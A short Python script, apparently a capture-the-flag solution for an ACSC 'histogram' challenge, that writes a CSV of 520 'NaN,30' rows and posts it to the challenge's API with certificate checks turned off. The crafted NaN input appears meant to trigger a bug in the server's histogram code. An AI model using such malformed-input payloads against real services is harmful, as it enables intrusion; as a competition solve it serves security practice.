import requests

f = open('solve.csv', 'w')
f.write('NaN,30\n'*0x208)
f.close()

r = requests.post('https://histogram.chal.acsc.asia/api/histogram', files={'csv' : open('solve.csv', 'r')}, verify=False)
print(r.content)
